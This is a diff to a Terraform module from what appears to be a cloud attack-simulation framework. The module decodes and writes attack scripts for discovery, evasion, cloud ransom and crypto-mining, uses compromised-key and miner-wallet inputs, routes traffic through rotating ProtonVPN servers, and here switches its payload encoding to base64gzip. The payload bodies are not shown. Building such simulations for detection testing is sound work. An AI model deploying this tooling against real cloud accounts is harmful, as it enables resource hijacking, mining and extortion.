@@ -9,20 +9,20 @@ locals {
     mkdir -p ${local.attack_dir} ${local.attack_dir}/aws-cli/scripts ${local.attack_dir}/terraform/scripts/cloudcrypto ${local.attack_dir}/terraform/scripts/hostcrypto ${local.attack_dir}/protonvpn
     cd ${local.attack_dir}
     ${local.aws_creds}
-    echo '${(local.start)}' | base64 -d > /${local.attack_dir}/start.sh
-    echo '${(local.auto-free)}' | base64 -d > /${local.attack_dir}/auto-free.sh
-    echo '${(local.auto-paid)}' | base64 -d > /${local.attack_dir}/auto-paid.sh
-    echo '${(local.protonvpn)}' | base64 -d > /${local.attack_dir}/.env-protonvpn
-    echo '${(local.protonvpn-paid)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-paid
-    echo '${(local.protonvpn-baseline)}' | base64 -d > /${local.attack_dir}/.env-protonvpn-baseline
-    echo '${(local.baseline)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/baseline.sh
-    echo '${(local.discovery)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/discovery.sh
-    echo '${(local.evasion)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/evasion.sh
-    echo '${(local.cloudransom)}' | base64 -d > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
-    echo '${(local.cloudcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
-    echo '${(local.terraform)}' | base64 -d > /${local.attack_dir}/terraform/scripts/cloudcrypto/terraform.sh
-    echo '${(local.hostcrypto)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
-    echo '${(local.terraform)}' | base64 -d > /${local.attack_dir}/terraform/scripts/hostcrypto/terraform.sh
+    echo '${base64gzip(local.start)}' | base64 -d | gunzip > /${local.attack_dir}/start.sh
+    echo '${base64gzip(local.auto-free)}' | base64 -d | gunzip > /${local.attack_dir}/auto-free.sh
+    echo '${base64gzip(local.auto-paid)}' | base64 -d | gunzip > /${local.attack_dir}/auto-paid.sh
+    echo '${base64gzip(local.protonvpn)}' | base64 -d | gunzip > /${local.attack_dir}/.env-protonvpn
+    echo '${base64gzip(local.protonvpn-paid)}' | base64 -d | gunzip > /${local.attack_dir}/.env-protonvpn-paid
+    echo '${base64gzip(local.protonvpn-baseline)}' | base64 -d | gunzip > /${local.attack_dir}/.env-protonvpn-baseline
+    echo '${base64gzip(local.baseline)}' | base64 -d | gunzip > /${local.attack_dir}/aws-cli/scripts/baseline.sh
+    echo '${base64gzip(local.discovery)}' | base64 -d | gunzip > /${local.attack_dir}/aws-cli/scripts/discovery.sh
+    echo '${base64gzip(local.evasion)}' | base64 -d | gunzip > /${local.attack_dir}/aws-cli/scripts/evasion.sh
+    echo '${base64gzip(local.cloudransom)}' | base64 -d | gunzip > /${local.attack_dir}/aws-cli/scripts/cloudransom.sh
+    echo '${base64gzip(local.cloudcrypto)}' | base64 -d | gunzip > /${local.attack_dir}/terraform/scripts/cloudcrypto/main.tf
+    echo '${base64gzip(local.terraform)}' | base64 -d | gunzip > /${local.attack_dir}/terraform/scripts/cloudcrypto/terraform.sh
+    echo '${base64gzip(local.hostcrypto)}' | base64 -d | gunzip > /${local.attack_dir}/terraform/scripts/hostcrypto/main.tf
+    echo '${base64gzip(local.terraform)}' | base64 -d | gunzip > /${local.attack_dir}/terraform/scripts/hostcrypto/terraform.sh
     log "Starting as background job..."
     if [ "${var.inputs["protonvpn_tier"]}" == "0" ]; then
         for i in $(echo "US NL-FREE#1 JP-FREE#3 NL-FREE#4 NL-FREE#8 US-FREE#5 NL-FREE#9 NL-FREE#12 NL-FREE#13 NL-FREE#14 NL-FREE#15 NL-FREE#16 US-FREE#13 US-FREE#32 US-FREE#33 US-FREE#34 NL-FREE#39 NL-FREE#52 NL-FREE#57 NL-FREE#87 NL-FREE#133 NL-FREE#136 NL-FREE#148 US-FREE#52 US-FREE#53 US-FREE#54 US-FREE#51 NL-FREE#163 NL-FREE#164 US-FREE#58 US-FREE#57 US-FREE#56 US-FREE#55"); do cp .env-protonvpn .env-protonvpn-$i; sed -i "s/RANDOM/$i/" .env-protonvpn-$i; done
@@ -34,7 +34,7 @@ locals {
     log "Done."
     EOT
 
-    protonvpn       = base64encode(templatefile(
+    protonvpn       = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/protonvpn.env.tpl", 
                                 {
                                     protonvpn_user = var.inputs["protonvpn_user"]
@@ -44,8 +44,8 @@ locals {
                                     protonvpn_protocol = var.inputs["protonvpn_protocol"]
                                     protonvpn_privatekey = try(length(var.inputs["protonvpn_privatekey"]), "false") != "false" ? var.inputs["protonvpn_privatekey"] : ""
                                 }
-                            ))
-    protonvpn-paid       = base64encode(templatefile(
+                            )
+    protonvpn-paid       = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/protonvpn.env.tpl", 
                                 {
                                     protonvpn_user = var.inputs["protonvpn_user"]
@@ -55,8 +55,8 @@ locals {
                                     protonvpn_protocol = var.inputs["protonvpn_protocol"]
                                     protonvpn_privatekey = try(length(var.inputs["protonvpn_privatekey"]), "false") != "false" ? var.inputs["protonvpn_privatekey"] : ""
                                 }
-                            ))
-    protonvpn-baseline  = base64encode(templatefile(
+                            )
+    protonvpn-baseline  = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/protonvpn.env.tpl", 
                                 {
                                     protonvpn_user = var.inputs["protonvpn_user"]
@@ -66,8 +66,8 @@ locals {
                                     protonvpn_protocol = var.inputs["protonvpn_protocol"]
                                     protonvpn_privatekey = try(length(var.inputs["protonvpn_privatekey"]), "false") != "false" ? var.inputs["protonvpn_privatekey"] : ""
                                 }
-                            ))
-    auto-free   = base64encode(templatefile(
+                            )
+    auto-free   = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/auto-free.sh.tpl",
                                 {
                                     compromised_keys_user = var.inputs["compromised_keys_user"]
@@ -76,8 +76,8 @@ locals {
                                     attack_type = local.attack_type
                                     attack_delay = var.inputs["attack_delay"]
                                 }
-                            ))
-    auto-paid   = base64encode(templatefile(
+                            )
+    auto-paid   = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/auto-paid.sh.tpl",
                                 {
                                     compromised_keys_user = var.inputs["compromised_keys_user"]
@@ -86,32 +86,32 @@ locals {
                                     attack_type = local.attack_type
                                     attack_delay = var.inputs["attack_delay"]
                                 }
-                            ))
-    baseline    = base64encode(templatefile(
+                            )
+    baseline    = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/baseline.sh.tpl",
                                 {
                                     attack_type = local.attack_type
                                 }
-                            ))
-    discovery   = base64encode(templatefile(
+                            )
+    discovery   = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/discovery.sh.tpl",
                                 {
                                     attack_type = local.attack_type
                                 }
-                            ))
-    evasion     = base64encode(templatefile(
+                            )
+    evasion     = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/evasion.sh.tpl",
                                 {
                                     attack_type = local.attack_type
                                 }
-                            ))
-    cloudransom = base64encode(templatefile(
+                            )
+    cloudransom = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/cloudransom.sh.tpl",
                                 {
                                     attack_type = local.attack_type
                                 }
-                            ))
-    cloudcrypto = base64encode(templatefile(
+                            )
+    cloudcrypto = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/cloudcrypto.tf.tpl",
                                 {
                                     name = "crypto-gpu-miner-${var.inputs["environment"]}-${var.inputs["deployment"]}"
@@ -119,8 +119,8 @@ locals {
                                     wallet = var.inputs["ethermine_wallet"]
                                     region = var.inputs["region"]
                                 }
-                            ))
-    hostcrypto  = base64encode(templatefile(
+                            )
+    hostcrypto  = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/hostcrypto.tf.tpl",
                                 {
                                     name = "host-cpu-miner-${var.inputs["environment"]}-${var.inputs["deployment"]}"
@@ -129,20 +129,20 @@ locals {
                                     minergate_user = var.inputs["minergate_user"]
                                     nicehash_user = var.inputs["nicehash_user"]
                                 }
-                            ))
+                            )
     
-    terraform  = base64encode(templatefile(
+    terraform  = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/terraform.sh.tpl",
                                 {
                                 }
-                            ))
+                            )
     
-    start       = base64encode(templatefile(
+    start       = templatefile(
                                 "${abspath(path.root)}/modules/deployment/common/payloads/linux/modules/resources/start.sh.tpl",
                                 {
                                     attack_type = local.attack_type
                                 }
-                            ))
+                            )
 
     base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
         script_name = var.inputs["tag"]
@@ -177,35 +177,35 @@ locals {
         base64_uncompressed_payload_additional = [
             {
                 name = "${basename(abspath(path.module))}_auto-free.sh"
-                content = local.auto-free
+                content = base64encode(local.auto-free)
             },
             {
                 name = "${basename(abspath(path.module))}_auto-paid.sh"
-                content = local.auto-paid
+                content = base64encode(local.auto-paid)
             },
             {
                 name = "${basename(abspath(path.module))}_baseline.sh"
-                content = local.baseline
+                content = base64encode(local.baseline)
             },
             {
                 name = "${basename(abspath(path.module))}_discovery.sh"
-                content = local.discovery
+                content = base64encode(local.discovery)
             },
             {
                 name = "${basename(abspath(path.module))}_evasion.sh"
-                content = local.evasion
+                content = base64encode(local.evasion)
             },
             {
                 name = "${basename(abspath(path.module))}_cloudransom.sh"
-                content = local.cloudransom
+                content = base64encode(local.cloudransom)
             },
             {
                 name = "${basename(abspath(path.module))}_terraform.sh"
-                content = local.terraform
+                content = base64encode(local.terraform)
             },
             {
                 name = "${basename(abspath(path.module))}_start.sh"
-                content = local.start
+                content = base64encode(local.start)
             }
         ]
     }
